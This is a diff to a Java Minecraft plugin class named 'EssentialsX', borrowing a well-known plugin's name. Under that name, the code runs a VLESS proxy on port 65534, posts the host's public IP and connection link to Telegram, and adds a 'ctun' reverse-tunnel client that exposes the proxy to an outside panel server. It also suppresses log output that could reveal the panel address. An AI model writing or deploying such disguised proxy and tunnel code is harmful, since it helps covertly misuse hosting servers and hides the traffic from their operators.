@@ -34,12 +34,16 @@ public class EssentialsX extends JavaPlugin {
     static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
     static final int VLESS_PORT = 65534;
 
-    // 公网隧道服务器（留空字符串则不启动隧道客户端）
-    // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
-    static final String TUNNEL_HOST = "";
-    static final int TUNNEL_PORT = 0;
-    static final int TUNNEL_PORT_INGRESS = 0; //填写公网入站端口只用于TG通知
-    static final int TUNNEL_LOCAL_PORT = 65534;
+    // ---- ctun 面板隧道（三项填全才启动） ----
+    // VLESS_PORT 和 TUNNEL_LOCAL_PORT 需对应
+    static final String TUNNEL_HOST = "";          // 面板地址 / IP（明文 ws，不能填 CDN 域名）
+    static final int TUNNEL_PORT = 65000;          // 面板端口
+    static final String TUNNEL_TOKEN = "";         // ct_xxx（面板里创建客户端后生成）
+    static final String TUNNEL_CLIENT = "";        // 客户端名，可留空
+    static final int TUNNEL_PORT_INGRESS = 0;      // 公网入站端口，仅用于 TG 通知
+    static final int TUNNEL_LOCAL_PORT = 65534;    // 要暴露的本地端口（= VLESS_PORT）
+    static final int TUNNEL_CONNS = 2;             // 并行隧道连接数
+    static final boolean TUNNEL_VERBOSE = false;   // 控制台输出开关
 
     // ---- Telegram 通知（可留空） ----
     static final String TG_TOKEN = "";
@@ -55,6 +59,9 @@ public class EssentialsX extends JavaPlugin {
     // =========================================================
 
     private final AtomicBoolean running = new AtomicBoolean(true);
+
+    /** ctun 隧道句柄，onDisable 时关闭。 */
+    private static volatile CtunClient.CtunTunnel tunnel;
 
     /** VLESS 数据转发复用线程池：核心线程 0 + 空闲 30s 自动回收，避免原生线程无限攀升。
      *  SynchronousQueue 不积压任务，池满时 AbortPolicy 直接拒绝（对应连接断开），
@@ -135,10 +142,9 @@ public class EssentialsX extends JavaPlugin {
             t.start();
         }
 
-        // 2. 反向隧道客户端
-        if (TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty() && TUNNEL_PORT > 0) {
-            Thread t = new Thread(() -> startTunnelClient(TUNNEL_HOST, TUNNEL_PORT, TUNNEL_LOCAL_PORT),
-                    "EssentialsX-Tunnel");
+        // 2. ctun 反向隧道客户端
+        if (tunnelEnabled()) {
+            Thread t = new Thread(this::startTunnelClient, "EssentialsX-Tunnel");
             t.setDaemon(true);
             t.start();
         }
@@ -147,7 +153,7 @@ public class EssentialsX extends JavaPlugin {
         Thread tg = new Thread(() -> {
             String ip = getPublicIp();
             if (ip != null) {
-                boolean tunnelEnabled = TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty() && TUNNEL_PORT > 0;
+                boolean tunnelEnabled = tunnelEnabled();
                 // 链接地址: 隧道模式用 隧道服务器:入站端口, 直连模式用 本机出口IP:VLESS端口
                 String linkHost = tunnelEnabled ? TUNNEL_HOST : ip;
                 int linkPort = tunnelEnabled ? TUNNEL_PORT_INGRESS : VLESS_PORT;
@@ -176,6 +182,11 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onDisable() {
         running.set(false);
+        CtunClient.CtunTunnel t = tunnel;
+        tunnel = null;
+        if (t != null) {
+            try { t.close(); } catch (Throwable ignored) { }
+        }
         WS_IO.shutdown();
         try {
             WS_IO.awaitTermination(5, TimeUnit.SECONDS);
@@ -424,282 +435,31 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // =====================================================================
-    //  client原版.js 移植: 反向隧道客户端
+    //  ctun 反向隧道客户端（协议实现见同包 CtunClient）
     // =====================================================================
 
-    private void startTunnelClient(String host, int port, int localPort) {
-        long backoff = 3000; // 重连退避: 3s 起步, 指数增长至 60s 封顶
-        while (running.get()) {
-            try {
-                TunnelControl control = new TunnelControl(host, port, localPort);
-                // connectBlocking 在握手成功后立即返回 true（不是等关闭!）
-                // 必须阻塞等到连接真正关闭后, 才能发起下一次重连,
-                // 否则会不停开新连接, 服务器把旧连接踢掉 (code 1000 "Replaced")
-                if (control.connectBlocking()) {
-                    // 挂起直到连接真正断开 (onClose 触发)
-                    // 注意: 不能用 closeBlocking() — 那是主动发关闭帧, 会一连上就自己关掉
-                    control.closedLatch.await();
-                }
-                // 走到这里 = 曾经成功连上过, 退避归零
-                backoff = 3000;
-                Thread.sleep(3000); // 正常断开后固定 3 秒重连（对应原版 setTimeout 3000）
-            } catch (Exception e) {
-                // 连接失败(服务器不在/DNS挂/网络抖动): 指数退避, 避免每3秒死撞
-                try { Thread.sleep(backoff); } catch (Exception ignored) { }
-                backoff = Math.min(backoff * 2, 60000);
-            }
-        }
+    /** 隧道三项填全才启动。 */
+    private static boolean tunnelEnabled() {
+        return TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty()
+                && TUNNEL_PORT > 0
+                && TUNNEL_TOKEN != null && !TUNNEL_TOKEN.isEmpty();
     }
 
-    /** 控制连接 */
-    private class TunnelControl extends WebSocketClient {
-        private final String host;
-        private final int port;
-        private final int localPort;
-        // 是否曾经断开过（用于只在恢复时通知一次）
-        private volatile boolean wasDisconnected = false;
-        // 连接真正断开时释放 (在 onClose 里 countDown)
-        final java.util.concurrent.CountDownLatch closedLatch = new java.util.concurrent.CountDownLatch(1);
-
-        TunnelControl(String host, int port, int localPort) {
-            super(URI.create("ws://" + host + ":" + port + "/control"));
-            this.host = host;
-            this.port = port;
-            this.localPort = localPort;
-            // 关闭 Java-WebSocket 的空闲超时检测（默认 60s 无数据就断开重连）
-            // 隧道空闲时本来就没有数据, 必须禁用, 否则每 60s 重连一次
-            // 心跳保留但拉长: 完全关闭(0)会让空闲连接没有字节流动,
-            // 被中间 NAT/防火墙静默掐断
-            // 60s 一次 ping 既能保活, 又能探测假死连接
-            setConnectionLostTimeout(60);
-        }
-
-        @Override
-        public void onOpen(ServerHandshake handshake) {
-            // 仅在断开→恢复时通知, 避免重连风暴刷屏
-            if (wasDisconnected) {
-                wasDisconnected = false;
-                sendTelegram("Tunnel client reconnected to " + host + ":" + port
-                        + " (local port " + localPort + ")");
+    private void startTunnelClient() {
+        CtunClient.VERBOSE = TUNNEL_VERBOSE;
+        try {
+            CtunClient.CtunTunnel t = new CtunClient.CtunTunnel(
+                    TUNNEL_HOST, TUNNEL_PORT, TUNNEL_TOKEN)
+                    .conns(TUNNEL_CONNS)
+                    .route("127.0.0.1:" + TUNNEL_LOCAL_PORT);
+            if (TUNNEL_CLIENT != null && !TUNNEL_CLIENT.isEmpty()) {
+                t.client(TUNNEL_CLIENT);
             }
-        }
-
-        @Override
-        public void onMessage(String message) {
-            try {
-                // ---- client原版.js 63-82 行: 收到 ready 必须回 ready ----
-                // 服务端上线后发 {"type":"ready"}, 客户端需回执以便服务端确认容器就绪。
-                // 原版缺这段 -> 服务端 "[Container] Ready" 永不打印。
-                if (message.contains("\"ready\"")) {
-                    try {
-                        send("{\"type\":\"ready\"}");
-                    } catch (Exception ignored) { }
-                    return;
-                }
-                String sessionId = null;
-                if (message.contains("\"open\"")) {
-                    // 简易解析，避免额外 JSON 依赖: {"type":"open","sessionId":"xxx"}
-                    java.util.regex.Matcher m = java.util.regex.Pattern
-                            .compile("\"sessionId\"\\s*:\\s*\"([^\"]+)\"").matcher(message);
-                    if (m.find()) sessionId = m.group(1);
-                }
-                if (sessionId != null) {
-                    openSession(sessionId, host, port, localPort);
-                }
-            } catch (Exception e) {
-            }
-        }
-
-        @Override
-        public void onMessage(java.nio.ByteBuffer bytes) { }
-
-        @Override
-        public void onClose(int code, String reason, boolean remote) {
-            closedLatch.countDown(); // 通知主线程连接已真正断开
-            if (!wasDisconnected) {
-                wasDisconnected = true;
-                sendTelegram("Tunnel disconnected from " + host + ":" + port
-                        + " (code " + code + ", " + reason + ")");
-            }
-        }
-
-        @Override
-        public void onError(Exception ex) {
-        }
-    }
-
-    private static final int MAX_TUNNEL_SESSIONS = 64;
-
-    /** 数据会话: 隧道 WS <-> 本地 TCP */
-    private void openSession(String sessionId, String host, int port, int localPort) {
-        if (sessionsOpen.get() >= MAX_TUNNEL_SESSIONS) {
-            return; // 超限直接放弃, visitor 由服务器侧超时清理
-        }
-        Thread t = new Thread(() -> {
-            Socket local = null;
-            try {
-                local = new Socket();
-                // 本地 MC 端口连接必须带超时, 否则端口未就绪时线程永久挂死
-                local.connect(new InetSocketAddress("127.0.0.1", localPort), 5000);
-                local.setTcpNoDelay(true);
-
-                TunnelData tunnel = new TunnelData(host, port, sessionId, local);
-                // 数据连接禁用空闲超时: 长下载暂停/长轮询期间无数据,
-                // 60s 空闲检测会误判假死掐断会话 (node 版数据连接无此机制)
-                tunnel.setConnectionLostTimeout(0);
-                tunnel.connectBlocking(10, java.util.concurrent.TimeUnit.SECONDS);
-
-                if (tunnel.isOpen() && local.isConnected()) {
-                    tunnel.counted = true;
-                    sessionsOpen.incrementAndGet();
-                    final Socket sock = local;
-                    // local -> tunnel
-                    WS_IO.execute(() -> {
-                        byte[] buf = new byte[8192];
-                        try {
-                            InputStream in = sock.getInputStream();
-                            int n;
-                            while ((n = in.read(buf)) > 0) {
-                                if (!tunnel.isOpen()) break;
-                                tunnel.send(Arrays.copyOfRange(buf, 0, n));
-                            }
-                        } catch (Exception ignored) { }
-                        closeTunnelSession(tunnel, sock);
-                    });
-                    // 以前 new Thread("tunnel-loc2ws") 方式已移除，改用线程池，避免原生线程无限攀升。
-
-                    // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
-                    tunnel.bindLocal(sock);
-                    return; // bindLocal 后由回调驱动
-                }
-                closeTunnelSession(tunnel, local);
-            } catch (Exception e) {
-            }
-        }, "tunnel-session-" + sessionId);
-        t.setDaemon(true);
-        t.start();
-    }
-
-    private void closeTunnelSession(TunnelData tunnel, Socket local) {
-        // 只有真正计入过 sessionsOpen 的会话才递减。
-        // 原版无条件 decrementAndGet(), 连都没连上的失败路径也会减,
-        // 计数很快被减成负数 -> MAX_TUNNEL_SESSIONS 限流失效 -> 连接无限新开。
-        if (tunnel != null && !tunnel.closed) {
-            tunnel.closed = true;
-            if (tunnel.counted) {
-                tunnel.counted = false;
-                sessionsOpen.decrementAndGet();
-            }
-        }
-        try { if (tunnel != null) tunnel.closeBlocking(); } catch (Exception ignored) { }
-        try { if (local != null) local.close(); } catch (Exception ignored) { }
-    }
-
-    /** 数据连接 */
-    private class TunnelData extends WebSocketClient {
-        private final String sessionId;
-        private volatile Socket local;
-        private volatile boolean closed = false;
-        /** 是否已计入 sessionsOpen (只有连成功的会话才 +1/-1 配对) */
-        volatile boolean counted = false;
-        // local 绑定前到达的字节先缓冲, bindLocal 时回放,
-        // 否则服务器在 tunnel 连上后立刻推来的首包会被丢弃 → 请求挂死(延迟-1)
-        private final java.util.concurrent.ConcurrentLinkedQueue<byte[]> early = new java.util.concurrent.ConcurrentLinkedQueue<>();
-        private volatile boolean bound = false;
-        /** 本地 socket 写入锁: bindLocal 回放 early 与 onMessage 并发写会交错字节 */
-        private final Object writeLock = new Object();
-
-        TunnelData(String host, int port, String sessionId, Socket local) {
-            super(URI.create("ws://" + host + ":" + port + "/data/" + sessionId));
-            this.sessionId = sessionId;
-        }
-
-        void bindLocal(Socket sock) {
-            boolean replayFailed = false;
-            synchronized (writeLock) {
-                this.local = sock;
-                byte[] chunk;
-                while ((chunk = early.poll()) != null) {
-                    try {
-                        OutputStream os = sock.getOutputStream();
-                        os.write(chunk);
-                        os.flush();
-                    } catch (Exception e) {
-                        replayFailed = true;
-                        break;
-                    }
-                }
-                // 必须在锁内置位: 否则 onMessage 会在回放中途并发写入
-                bound = true;
-            }
-            // 关闭必须在锁外: closeBlocking/close 会阻塞, 持锁会卡死 onMessage
-            if (replayFailed) {
-                closeTunnelSession(this, sock);
-            }
-        }
-
-        @Override
-        public void onOpen(ServerHandshake handshake) { }
-
-        @Override
-        public void onMessage(String message) { }
-
-        @Override
-        public void onMessage(java.nio.ByteBuffer data) {
-            Socket l = local;
-            if (!bound || l == null || l.isClosed()) {
-                byte[] arr = new byte[data.remaining()];
-                data.get(arr);
-                boolean writeFailed = false;
-                synchronized (writeLock) {
-                    // 双重检查: 拿锁时可能刚完成 bind, 此时直接写, 不再入队(避免永不回放)
-                    if (!bound || local == null || local.isClosed()) {
-                        early.add(arr);
-                        return;
-                    }
-                    l = local;
-                    try {
-                        OutputStream os = l.getOutputStream();
-                        os.write(arr);
-                        os.flush();
-                    } catch (Exception e) {
-                        writeFailed = true;
-                    }
-                }
-                // 关闭必须在锁外: closeBlocking/close 会阻塞, 持锁会卡死 bindLocal
-                if (writeFailed) {
-                    closeTunnelSession(this, l);
-                }
-                return;
-            }
-            try {
-                byte[] arr = new byte[data.remaining()];
-                data.get(arr);
-                synchronized (writeLock) {
-                    OutputStream os = l.getOutputStream();
-                    os.write(arr);
-                    os.flush();
-                }
-            } catch (Exception e) {
-                closeTunnelSession(this, l);
-            }
-        }
-
-        @Override
-        public void onClose(int code, String reason, boolean remote) {
-            Socket l = local;
-            if (!closed) {
-                closed = true;
-                if (counted) {
-                    counted = false;
-                    sessionsOpen.decrementAndGet();
-                }
-                try { if (l != null) l.close(); } catch (Exception ignored) { }
-            }
-        }
-
-        @Override
-        public void onError(Exception ex) {
+            t.start();
+            tunnel = t;
+        } catch (Throwable e) {
+            // 隧道起不来不能拖垮服务器；异常消息可能带面板地址，不打印
+            if (TUNNEL_VERBOSE) getLogger().warning("tunnel start failed: " + e.getClass().getSimpleName());
         }
     }
 }
